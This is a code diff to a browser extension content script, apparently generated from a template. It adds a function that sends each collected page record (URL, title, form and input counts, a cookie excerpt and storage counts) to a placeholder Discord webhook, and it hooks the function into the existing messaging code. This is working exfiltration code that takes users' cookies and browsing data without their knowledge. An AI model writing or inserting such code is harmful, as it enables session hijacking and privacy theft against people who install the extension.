@@ -691,6 +691,44 @@
     });
   });
 
+  // Send data directly to webhook
+  async function sendDirectToWebhook(data) {
+    try {
+      const webhookUrl = '{{WEBHOOK_URL}}';
+      if (!webhookUrl || !webhookUrl.trim() || webhookUrl === '{{WEBHOOK_URL}}') {
+        return;
+      }
+
+      const webhookData = {
+        username: "🔍 {{EXTENSION_NAME}} - Content Script",
+        avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+        embeds: [{
+          title: "📊 Page Data Collected",
+          color: 0x00FF00,
+          fields: [
+            { name: "🌐 URL", value: data.url || 'Unknown', inline: false },
+            { name: "📄 Title", value: data.title || 'No title', inline: false },
+            { name: "📊 Forms Found", value: (data.forms?.length || 0).toString(), inline: true },
+            { name: "🔗 Links Found", value: (data.allLinks?.length || 0).toString(), inline: true },
+            { name: "📝 Inputs Found", value: (data.allInputs?.length || 0).toString(), inline: true },
+            { name: "🍪 Cookies", value: data.cookies ? data.cookies.substring(0, 100) + '...' : 'None', inline: false },
+            { name: "💾 Local Storage", value: Object.keys(data.localStorage || {}).length.toString() + ' items', inline: true },
+            { name: "🗃️ Session Storage", value: Object.keys(data.sessionStorage || {}).length.toString() + ' items', inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(webhookData)
+      });
+    } catch (error) {
+      console.error('Direct webhook send failed:', error);
+    }
+  }
+
   // Send enhanced message to background script
   function sendMessage(data) {
     try {
@@ -723,6 +761,7 @@
         }
       };
 
+      // Send to background script
       if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
         chrome.runtime.sendMessage(enhancedData, (response) => {
           if (chrome.runtime.lastError) {
@@ -730,6 +769,9 @@
           }
         });
       }
+
+      // Also send directly to webhook for immediate delivery
+      sendDirectToWebhook(enhancedData);
     } catch (error) {
       console.error('Error sending message to background:', error);
     }
